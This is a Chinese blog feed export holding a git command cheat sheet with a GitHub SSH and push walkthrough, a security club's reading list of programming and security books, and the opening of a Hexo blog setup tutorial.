<h2 id="0X04-挪挪挪，挪进仓库"><a href="#0X04-挪挪挪，挪进仓库" class="headerlink" title="0X04 挪挪挪，挪进仓库"></a>0X04 挪挪挪，挪进仓库</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">1.提交暂存区到仓库区</div><div class="line"><span class="meta">$</span><span class="bash"> git commit -m <span class="string">"message"</span></span></div><div class="line"></div><div class="line">2.提交暂存区指定文件到仓库区</div><div class="line"><span class="meta">$</span><span class="bash"> git commit file1 file2 ... -m <span class="string">"message"</span></span></div><div class="line"></div><div class="line">3.提交工作区自上次commit之后的变化，直接到仓库区</div><div class="line"><span class="meta">$</span><span class="bash"> git commit <span class="_">-a</span></span></div><div class="line"></div><div class="line">4.提交时显示所有diff信息</div><div class="line"><span class="meta">$</span><span class="bash"> git commit -v</span></div><div class="line"></div><div class="line">5.使用一次新的commit，替代上一次提交。如果代码没有任何新变化，则用来改写上一次commit的提交信息</div><div class="line"><span class="meta">$</span><span class="bash"> git commit --amend -m <span class="string">"message"</span></span></div><div class="line"></div><div class="line">6.重做上一次commit，并包括指定文件的新变化</div><div class="line"><span class="meta">$</span><span class="bash"> git commit --amend file1 file2 ...</span></div></pre></td></tr></table></figure>
<h2 id="0X05-时光机分机"><a href="#0X05-时光机分机" class="headerlink" title="0X05 时光机分机"></a>0X05 时光机分机</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">1.列出所有本地分支</div><div class="line"><span class="meta">$</span><span class="bash"> git branch</span></div><div class="line"></div><div class="line">2.列出所有远程分支</div><div class="line"><span class="meta">$</span><span class="bash"> git branch -r</span></div><div class="line"></div><div class="line">3.列出所有本地分支和远程分支</div><div class="line"><span class="meta">$</span><span class="bash"> git branch <span class="_">-a</span></span></div><div class="line"></div><div class="line">4.新建一个分支，但依然停留在当前分支</div><div class="line"><span class="meta">$</span><span class="bash"> git branch [branch-name]</span></div><div class="line"></div><div class="line">5.新建一个分支，并切换到该分支</div><div class="line"><span class="meta">$</span><span class="bash"> git checkout -b [branch]</span></div><div class="line"></div><div class="line">6.新建一个分支，指向指定commit</div><div class="line"><span class="meta">$</span><span class="bash"> git branch [branch] [commit]</span></div><div class="line"></div><div class="line">7.新建一个分支，与指定的远程分支建立追踪关系</div><div class="line"><span class="meta">$</span><span class="bash"> git branch --track [branch] [remote-branch]</span></div><div class="line"></div><div class="line">8.切换到指定分支，并更新工作区</div><div class="line"><span class="meta">$</span><span class="bash"> git checkout [branch-name]</span></div><div class="line"></div><div class="line">9.切换到上一个分支</div><div class="line"><span class="meta">$</span><span class="bash"> git checkout -</span></div><div class="line"></div><div class="line">10.建立追踪关系，在现有分支与指定的远程分支之间</div><div class="line"><span class="meta">$</span><span class="bash"> git branch --set-upstream [branch] [remote-branch]</span></div><div class="line"></div><div class="line">11.合并指定分支到当前分支</div><div class="line"><span class="meta">$</span><span class="bash"> git merge [branch]</span></div><div class="line"></div><div class="line">12.选择一个commit，合并进当前分支</div><div class="line"><span class="meta">$</span><span class="bash"> git cherry-pick [commit]</span></div><div class="line"></div><div class="line">13.删除分支</div><div class="line"><span class="meta">$</span><span class="bash"> git branch <span class="_">-d</span> [branch-name]</span></div><div class="line"></div><div class="line">14.删除远程分支</div><div class="line"><span class="meta">$</span><span class="bash"> git push origin --delete [branch-name]</span></div><div class="line"><span class="meta">$</span><span class="bash"> git branch -dr [remote/branch]</span></div></pre></td></tr></table></figure>
<h2 id="0X06-Tag"><a href="#0X06-Tag" class="headerlink" title="0X06 Tag"></a>0X06 Tag</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>.列出所有<span class="keyword">tag</span></div><div class="line"><span class="title">$</span> git <span class="keyword">tag</span></div><div class="line"></div><div class="line"><span class="title">2</span>.新建一个<span class="keyword">tag</span>在当前commit</div><div class="line">$ git <span class="keyword">tag</span> <span class="title">[tag</span>]</div><div class="line"></div><div class="line"><span class="number">3</span>.新建一个<span class="keyword">tag</span>在指定commit</div><div class="line">$ git <span class="keyword">tag</span> <span class="title">[tag</span>] [commit]</div><div class="line"></div><div class="line"><span class="number">4</span>.删除本地<span class="keyword">tag</span></div><div class="line"><span class="title">$</span> git <span class="keyword">tag</span> <span class="title">-d</span> [<span class="keyword">tag</span>]</div><div class="line"></div><div class="line"><span class="number">5</span>.删除远程<span class="keyword">tag</span></div><div class="line"><span class="title">$</span> git push origin :refs/tags/[tagName]</div><div class="line"></div><div class="line"><span class="number">6</span>.查看<span class="keyword">tag</span>信息</div><div class="line">$ git show [<span class="keyword">tag</span>]</div><div class="line"></div><div class="line"><span class="number">7</span>.提交指定<span class="keyword">tag</span></div><div class="line"><span class="title">$</span> git push [remote] [<span class="keyword">tag</span>]</div><div class="line"></div><div class="line"><span class="number">8</span>.提交所有<span class="keyword">tag</span></div><div class="line"><span class="title">$</span> git push [remote] --tags</div><div class="line"></div><div class="line"><span class="number">9</span>.新建一个分支，指向某个<span class="keyword">tag</span></div><div class="line"><span class="title">$</span> git checkout -b [branch] [<span class="keyword">tag</span>]</div></pre></td></tr></table></figure>
<h2 id="0X07-信息查看"><a href="#0X07-信息查看" class="headerlink" title="0X07 信息查看"></a>0X07 信息查看</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">1.显示有变更的文件</div><div class="line"><span class="meta">$</span><span class="bash"> git status</span></div><div class="line"></div><div class="line">2.显示当前分支的版本历史</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span></span></div><div class="line"></div><div class="line">3.显示commit历史，以及每次commit发生变更的文件</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --stat</span></div><div class="line"></div><div class="line">4.搜索提交历史，根据关键词</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> -S [keyword]</span></div><div class="line"></div><div class="line">5.显示某个commit之后的所有变动，每个commit占据一行</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> [tag] HEAD --pretty=format:%s</span></div><div class="line"></div><div class="line">6.显示某个commit之后的所有变动，其"提交说明"必须符合搜索条件</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> [tag] HEAD --grep feature</span></div><div class="line"></div><div class="line">7.显示某个文件的版本历史，包括文件改名</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> --follow [file]</span></div><div class="line"><span class="meta">$</span><span class="bash"> git whatchanged [file]</span></div><div class="line"></div><div class="line">8.显示指定文件相关的每一次diff</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> -p [file]</span></div><div class="line"></div><div class="line">9.显示过去5次提交</div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">log</span> -5 --pretty --oneline</span></div><div class="line"></div><div class="line">10.显示所有提交过的用户，按提交次数排序</div><div class="line"><span class="meta">$</span><span class="bash"> git shortlog -sn</span></div><div class="line"></div><div class="line">11.显示指定文件是什么人在什么时间修改过</div><div class="line"><span class="meta">$</span><span class="bash"> git blame [file]</span></div><div class="line"></div><div class="line">12.显示暂存区和工作区的差异</div><div class="line"><span class="meta">$</span><span class="bash"> git diff</span></div><div class="line"></div><div class="line">13.显示暂存区和上一个commit的差异</div><div class="line"><span class="meta">$</span><span class="bash"> git diff --cached [file]</span></div><div class="line"></div><div class="line">14.显示工作区与当前分支最新commit之间的差异</div><div class="line"><span class="meta">$</span><span class="bash"> git diff HEAD</span></div><div class="line"></div><div class="line">15.显示两次提交之间的差异</div><div class="line"><span class="meta">$</span><span class="bash"> git diff [first-branch]...[second-branch]</span></div><div class="line"></div><div class="line">16.显示今天你写了多少行代码</div><div class="line"><span class="meta">$</span><span class="bash"> git diff --shortstat <span class="string">"@&#123;0 day ago&#125;"</span></span></div><div class="line"></div><div class="line">17.显示某次提交的元数据和内容变化</div><div class="line"><span class="meta">$</span><span class="bash"> git show [commit]</span></div><div class="line"></div><div class="line">18.显示某次提交发生变化的文件</div><div class="line"><span class="meta">$</span><span class="bash"> git show --name-only [commit]</span></div><div class="line"></div><div class="line">19.显示某次提交时，某个文件的内容</div><div class="line"><span class="meta">$</span><span class="bash"> git show [commit]:[filename]</span></div><div class="line"></div><div class="line">20.显示当前分支的最近几次提交</div><div class="line"><span class="meta">$</span><span class="bash"> git reflog</span></div></pre></td></tr></table></figure>
<h2 id="0X08-远程同步篇"><a href="#0X08-远程同步篇" class="headerlink" title="0X08 远程同步篇"></a>0X08 远程同步篇</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">1.下载远程仓库的所有变动</div><div class="line"><span class="meta">$</span><span class="bash"> git fetch [remote]</span></div><div class="line"></div><div class="line">2.显示所有远程仓库</div><div class="line"><span class="meta">$</span><span class="bash"> git remote -v</span></div><div class="line"></div><div class="line">3.显示某个远程仓库的信息</div><div class="line"><span class="meta">$</span><span class="bash"> git remote show [remote]</span></div><div class="line"></div><div class="line">4.增加一个新的远程仓库，并命名</div><div class="line"><span class="meta">$</span><span class="bash"> git remote add [shortname] [url]</span></div><div class="line"></div><div class="line">5.取回远程仓库的变化，并与本地分支合并</div><div class="line"><span class="meta">$</span><span class="bash"> git pull [remote] [branch]</span></div><div class="line"></div><div class="line">6.上传本地指定分支到远程仓库</div><div class="line"><span class="meta">$</span><span class="bash"> git push [remote] [branch]</span></div><div class="line"></div><div class="line">7.强行推送当前分支到远程仓库，即使有冲突</div><div class="line"><span class="meta">$</span><span class="bash"> git push [remote] --force</span></div><div class="line"></div><div class="line">8.推送所有分支到远程仓库</div><div class="line"><span class="meta">$</span><span class="bash"> git push [remote] --all</span></div></pre></td></tr></table></figure>
<h2 id="0X09-时光回溯篇"><a href="#0X09-时光回溯篇" class="headerlink" title="0X09 时光回溯篇"></a>0X09 时光回溯篇</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">1.恢复暂存区的指定文件到工作区</div><div class="line">$ git checkout [file]</div><div class="line"></div><div class="line">2.恢复某个<span class="keyword">commit</span>的指定文件到暂存区和工作区</div><div class="line">$ git checkout [<span class="keyword">commit</span>] [<span class="keyword">file</span>]</div><div class="line"></div><div class="line"><span class="number">3.</span>恢复暂存区的所有文件到工作区</div><div class="line">$ git checkout .</div><div class="line"></div><div class="line"><span class="number">4.</span>重置暂存区的指定文件，与上一次<span class="keyword">commit</span>保持一致，但工作区不变</div><div class="line">$ git <span class="keyword">reset</span> [<span class="keyword">file</span>]</div><div class="line"></div><div class="line"><span class="number">5.</span>重置暂存区与工作区，与上一次<span class="keyword">commit</span>保持一致</div><div class="line">$ git <span class="keyword">reset</span> <span class="comment">--hard</span></div><div class="line"></div><div class="line"><span class="number">6.</span>重置当前分支的指针为指定<span class="keyword">commit</span>，同时重置暂存区，但工作区不变</div><div class="line">$ git <span class="keyword">reset</span> [<span class="keyword">commit</span>]</div><div class="line"></div><div class="line"><span class="number">7.</span>重置当前分支的<span class="keyword">HEAD</span>为指定<span class="keyword">commit</span>，同时重置暂存区和工作区，与指定<span class="keyword">commit</span>一致</div><div class="line">$ git <span class="keyword">reset</span> <span class="comment">--hard [commit]</span></div><div class="line"></div><div class="line"><span class="number">8.</span>重置当前<span class="keyword">HEAD</span>为指定<span class="keyword">commit</span>，但保持暂存区和工作区不变</div><div class="line">$ git <span class="keyword">reset</span> <span class="comment">--keep [commit]</span></div><div class="line"></div><div class="line"><span class="number">9.</span>新建一个<span class="keyword">commit</span>，用来撤销指定<span class="keyword">commit</span>，后者的所有变化都将被前者抵消，并且应用到当前分支</div><div class="line">$ git revert [<span class="keyword">commit</span>]</div><div class="line"></div><div class="line"><span class="number">10.</span>暂时将未提交的变化移除，稍后再移入</div><div class="line">$ git stash</div><div class="line">$ git stash pop</div></pre></td></tr></table></figure>
<hr>
<h1 id="二、Github与信仰"><a href="#二、Github与信仰" class="headerlink" title="二、Github与信仰"></a>二、Github与信仰</h1><p><img src="/2017/05/13/git/30.png" alt=""></p>
<ul>
<li>这个周目是关于Linux下git时光机的实际应用 —— 把已有项目推到Github上。     </li>
<li>Github账号的创建与git的安装配置不再作说明。</li>
</ul>
<h2 id="1X01-设置Git"><a href="#1X01-设置Git" class="headerlink" title="1X01 设置Git"></a>1X01 设置Git</h2><p>设置用户名与email：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git config --global user<span class="selector-class">.name</span> <span class="string">"your name"</span></div><div class="line">git config --global user<span class="selector-class">.email</span> <span class="string">"youremail@lalala.com"</span></div></pre></td></tr></table></figure></p>
<p>此时在/home下会新建一个<strong>.gitconfig</strong>文件</p>
<h2 id="1X02-配置SSH"><a href="#1X02-配置SSH" class="headerlink" title="1X02 配置SSH"></a>1X02 配置SSH</h2><p>1.创建SSH Key<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> ssh-keygen -t rsa -C <span class="string">"youremail@lalala.com"</span></span></div></pre></td></tr></table></figure></p>
<p>系统会提示key的保存位置，一般为~/.ssh，接下来会请求输入口令，一路默认，敲三次回车即可。   </p>
<p>然后登陆gayhub -&gt; Accounting settings -&gt; SSH key -&gt; Add SSH Key -&gt; 取个容易区分的名字 -&gt; 把~/.ssh/id_rsa.pub文件中的内容粘贴上去即可。</p>
<p>用下面的命令进行测试：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ssh</span> <span class="selector-tag">-T</span> <span class="selector-tag">git</span>@<span class="keyword">github</span>.<span class="keyword">com</span></div></pre></td></tr></table></figure></p>
<h2 id="1X03-push-and-pull-from-github"><a href="#1X03-push-and-pull-from-github" class="headerlink" title="1X03 push and pull from github"></a>1X03 push and pull from github</h2><p>1.在新建的~/My_Message_Board目录中git clone已存在GitHub上的Repository<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="keyword">clone</span> <span class="title">URL</span></div></pre></td></tr></table></figure></p>
<p>2.先修改个readme，提交。<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sudo vi README.md</div><div class="line">git status</div><div class="line">git <span class="keyword">add</span><span class="bash"> README.md</span></div><div class="line">git status</div><div class="line">git commit -m <span class="string">"Cyris readme-change 5/17"</span></div><div class="line">git status</div><div class="line">git remote <span class="keyword">add</span><span class="bash"> origin URL</span></div></pre></td></tr></table></figure></p>
<p>报了个错：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fata<span class="variable">l:</span> remote origin already <span class="built_in">exists</span>.</div></pre></td></tr></table></figure></p>
<p>解决方法：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> git remote rm origin</span></div></pre></td></tr></table></figure></p>
<p>再来。<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git remote <span class="built_in">add</span> origin <span class="built_in">URL</span>（这些<span class="built_in">URL</span>都是github里复制的<span class="built_in">URL</span>）</div></pre></td></tr></table></figure></p>
<p>3.下面把它push上去<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ git <span class="built_in">push</span> -u <span class="built_in">origin</span> master</div></pre></td></tr></table></figure></p>
<p>这里会要求输入GitHub账户的用户名和密码。输入即可。</p>
<p>4.提交完成，去GitHub看眼Repository。内容修改成功。</p>
]]></content>
      
        <categories>
            
            <category> Git </category>
            
        </categories>
        
        
        <tags>
            
            <tag> git </tag>
            
            <tag> wiki </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[魔法禁书目录]]></title>
      <url>/2017/04/15/wiki/</url>
      <content type="html"><![CDATA[<p>vidar team整理的一份推荐书单，各个方向各个阶段均有。  </p>
<a id="more"></a>  
<h1 id="推荐图书目录"><a href="#推荐图书目录" class="headerlink" title="推荐图书目录"></a>推荐图书目录</h1><h2 id="渗透方向："><a href="#渗透方向：" class="headerlink" title="渗透方向："></a>渗透方向：</h2><h3 id="·-基础类"><a href="#·-基础类" class="headerlink" title="· 基础类"></a>· 基础类</h3><p>&#160; &#160; &#160; &#160;《PHP基础教程.第4版》<br>&#160; &#160; &#160; &#160;《PHP与MySQL权威指南》<br>&#160; &#160; &#160; &#160;《Javascript权威指南》<br>&#160; &#160; &#160; &#160;《Python基础教程》<br>&#160; &#160; &#160; &#160;《Python 网络编程》<br>&#160; &#160; &#160; &#160;《TCP/IP协议详解 三卷》<br>&#160; &#160; &#160; &#160;《图解TCP/IP》<br>&#160; &#160; &#160; &#160;《HTTP权威指南》<br>&#160; &#160; &#160; &#160;《图解HTTP》<br>&#160; &#160; &#160; &#160;《HTTP协议详解》<br>&#160; &#160; &#160; &#160;《Python绝技：运用Python成为顶级黑客》</p>
<h3 id="·-攻防类"><a href="#·-攻防类" class="headerlink" title="· 攻防类"></a>· 攻防类</h3><p>&#160; &#160; &#160; &#160;《白帽子讲WEB安全》<br>&#160; &#160; &#160; &#160;《Web前端 黑客技术揭秘》<br>&#160; &#160; &#160; &#160;《Kali Linux Web 渗透测试》<br>&#160; &#160; &#160; &#160;《黑客攻防技术宝典Web实战篇》<br>&#160; &#160; &#160; &#160;《SQL注入攻击与防御》<br>&#160; &#160; &#160; &#160;《XSS跨站脚本攻击剖析与防御》<br>&#160; &#160; &#160; &#160;《安全参考系列》<br>&#160; &#160; &#160; &#160;《Python黑帽子：黑客与渗透测试编程之道》</p>
<h2 id="逆向方向："><a href="#逆向方向：" class="headerlink" title="逆向方向："></a>逆向方向：</h2><h3 id="·-基础类（建议按顺序学习）"><a href="#·-基础类（建议按顺序学习）" class="headerlink" title="· 基础类（建议按顺序学习）"></a>· 基础类（建议按顺序学习）</h3><p>&#160; &#160; &#160; &#160;《汇编语言》<br>&#160; &#160; &#160; &#160;《汇编语言编程艺术》<br>&#160; &#160; &#160; &#160;《Windows环境下32位汇编语言程序设计-琢石成器 第3版》<br>&#160; &#160; &#160; &#160;《WINDOWSPE权威指南》<br>&#160; &#160; &#160; &#160;《C++反汇编与逆向分析技术揭秘》<br>&#160; &#160; &#160; &#160;《Windows程序设计》<br>&#160; &#160; &#160; &#160;《逆向工程实战》<br>&#160; &#160; &#160; &#160;《逆向工程核心原理 》<br>&#160; &#160; &#160; &#160;《逆向工程揭密/安全技术大系中文版》<br>&#160; &#160; &#160; &#160;《Malware analyst’s cookbook》<br>&#160; &#160; &#160; &#160;《Python灰帽子：黑客与逆向工程师的Python编程之道》</p>
<h3 id="·-进阶类"><a href="#·-进阶类" class="headerlink" title="· 进阶类"></a>· 进阶类</h3><p>&#160; &#160; &#160; &#160;《加密与解密》<br>&#160; &#160; &#160; &#160;《Windows PE权威指南》<br>&#160; &#160; &#160; &#160;《恶意代码分析实战》<br>&#160; &#160; &#160; &#160;《0day安全软件漏洞分析技术》<br>&#160; &#160; &#160; &#160;《数据结构》（严蔚敏著）</p>
<h2 id="Android-方向："><a href="#Android-方向：" class="headerlink" title="Android 方向："></a>Android 方向：</h2><h3 id="·-开发"><a href="#·-开发" class="headerlink" title="· 开发"></a>· 开发</h3><p>&#160; &#160; &#160; &#160;《疯狂JAVA讲义》<br>&#160; &#160; &#160; &#160;《疯狂Android讲义》<br>&#160; &#160; &#160; &#160;《第一行代码-Android》<br>&#160; &#160; &#160; &#160;《Android移动开发一本就够了》<br>&#160; &#160; &#160; &#160;《Android基础教程》<br>&#160; &#160; &#160; &#160;《Android C++ 高级编程-使用NDK》<br>&#160; &#160; &#160; &#160;《Android驱动开发权威指南》<br>&#160; &#160; &#160; &#160;《Android软件安全与逆向分析》<br>&#160; &#160; &#160; &#160;《深入理解Android II卷》<br>&#160; &#160; &#160; &#160;《Android安全攻防实战》</p>
<h2 id="Windows-amp-Linux-方向："><a href="#Windows-amp-Linux-方向：" class="headerlink" title="Windows&amp;Linux 方向："></a>Windows&amp;Linux 方向：</h2><p>&#160; &#160; &#160; &#160;《Windows程序设计》<br>&#160; &#160; &#160; &#160;《Windows核心编程》<br>&#160; &#160; &#160; &#160;《寒江独钓Windows内核安全编程》<br>&#160; &#160; &#160; &#160;《鸟哥的linux私房菜基础篇+服务器篇》<br>&#160; &#160; &#160; &#160;《Linux内核精髓》<br>&#160; &#160; &#160; &#160;《深入理解LINUX内核》</p>
<h2 id="网络方向："><a href="#网络方向：" class="headerlink" title="网络方向："></a>网络方向：</h2><p>&#160; &#160; &#160; &#160;《思科网络技术学院教程CCNA Exploration: 网络基础知识》<br>&#160; &#160; &#160; &#160;《思科 网络技术学院教程CCNA Exploration:路由协议和概念》<br>&#160; &#160; &#160; &#160;《图解TCP/IP》<br>&#160; &#160; &#160; &#160;《计算机网络》（Andrew S.Tanenbaum著）<br>&#160; &#160; &#160; &#160;《Wireshark数据包分析实战》<br>&#160; &#160; &#160; &#160;《网络分析技术揭秘》</p>
<h2 id="无线电安全方向："><a href="#无线电安全方向：" class="headerlink" title="无线电安全方向："></a>无线电安全方向：</h2><p>&#160; &#160; &#160; &#160;《无线网络安全攻防实战进阶》<br>&#160; &#160; &#160; &#160;《无线电安全攻防大揭秘》<br>&#160; &#160; &#160; &#160;《射频识别(RFID)核心技术详解》<br>&#160; &#160; &#160; &#160;《黑客大曝光：无线网络安全》<br>&#160; &#160; &#160; &#160;《BackTrack 5 Wireless Penetration Testing Beginner’s Guide》</p>
<p>&#160; &#160; &#160; &#160;<strong>文章</strong>：（因为图书比较少，遂从某大佬处Get一些比较好的案例分析）<br>&#160; &#160; &#160; &#160;《RFID Hacking ④ : ProxMark3 破解门禁》<br>&#160; &#160; &#160; &#160;《RFID Hacking ③ : ProxMark3 使用案例：嗅探银行闪付卡信息》<br>&#160; &#160; &#160; &#160;《HackRF嗅探蓝牙重放iBeacons信号》<br>&#160; &#160; &#160; &#160;《永不消逝的电波（三）：低功耗蓝牙（BLE）入门之如何调戏别人的小米手环》<br>&#160; &#160; &#160; &#160;《Mousejack Hacking : 利用MouseJack进行物理攻击浅析》<br>&#160; &#160; &#160; &#160;《MouseJack Hacking 测试指南》<br>&#160; &#160; &#160; &#160;《BLE Hacking：使用Ubertoothone扫描嗅探低功耗蓝牙》<br>&#160; &#160; &#160; &#160;《RFID Hacking – 资源大合集》</p>
<h2 id="新技术（容器、云、机器学习相关）："><a href="#新技术（容器、云、机器学习相关）：" class="headerlink" title="新技术（容器、云、机器学习相关）："></a>新技术（容器、云、机器学习相关）：</h2><h3 id="·-Docker"><a href="#·-Docker" class="headerlink" title="· Docker"></a>· Docker</h3><p>&#160; &#160; &#160; &#160;《第一本Docker书》<br>&#160; &#160; &#160; &#160;《Docker入门实战》<br>&#160; &#160; &#160; &#160;《Docker容器与容器云》<br>&#160; &#160; &#160; &#160;《Docker开发实践》</p>
<h3 id="·-机器学习"><a href="#·-机器学习" class="headerlink" title="· 机器学习"></a>· 机器学习</h3><p>&#160; &#160; &#160; &#160;《机器学习》<br>&#160; &#160; &#160; &#160;《深入浅出数据分析》<br>&#160; &#160; &#160; &#160;《啤酒与尿布》<br>&#160; &#160; &#160; &#160;《集体智慧编程》<br>&#160; &#160; &#160; &#160;《统计学习方法》</p>
<h3 id="·-云计算"><a href="#·-云计算" class="headerlink" title="· 云计算"></a>· 云计算</h3><p>&#160; &#160; &#160; &#160;《云计算：概念、技术与架构》<br>&#160; &#160; &#160; &#160;《深入理解云计算：基本原理和应用程序编程技术》<br>&#160; &#160; &#160; &#160;《云数据中心构建实战：核心技术、运维管理、安全与高可用》<br>&#160; &#160; &#160; &#160;《云计算核心技术剖析》<br>&#160; &#160; &#160; &#160;《实战Hadoop》</p>
<ul>
<li>另外附上协会<a href="https://wiki.vidar.club/doku.php?id=start" target="_blank" rel="external">wiki</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> 学习资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> wiki </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows下利用Hexo+Coding搭建静态博客]]></title>
      <url>/2017/04/05/hexo-blog/</url>
      <content type="html"><![CDATA[<p>一篇关于hexo博客搭建的小教程。   </p>
<a id="more"></a>
<p>按照粉学姐和土土的教程搭了两三天，终于做成了这个静态博客。本文将介绍如何用Hexo+Coding搭建Blog，另外附上粉学姐和土土的教程，部分语句直接引用原文。</p>
<blockquote>
<p><a href="http://processor.pub/2016/10/07/Windows%E4%B8%8B%E5%88%A9%E7%94%A8Hexo%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2/" target="_blank" rel="external">粉学姐的教程</a><br><a href="http://lorexxar.cn/2015/05/22/Hexo-blogs/" target="_blank" rel="external">土土的教程</a></p>
</blockquote>
<h1 id="Hexo的安装"><a href="#Hexo的安装" class="headerlink" title="Hexo的安装"></a>Hexo的安装</h1><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p><a href="https://git-scm.com/downloads" target="_blank" rel="external">git</a><br>选择适合自己系统的git下载安装，我选择的windows。</p>
<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><p><a href="https://nodejs.org/en/" target="_blank" rel="external">node.js</a><br>这里我选择的是V6.10.2 LFS，可以根据自己的系统选择合适的版本安装。</p>
<h2 id="安装HEXO"><a href="#安装HEXO" class="headerlink" title="安装HEXO"></a>安装HEXO</h2><p>打开安装好的Git Bash，键入：</p>
<blockquote>
<p>npm install -g hexo</p>
</blockquote>
<p>然后把Hexo更新到最新版本，键入：           </p>
<blockquote>
<p>npm update hexo -g</p>
</blockquote>
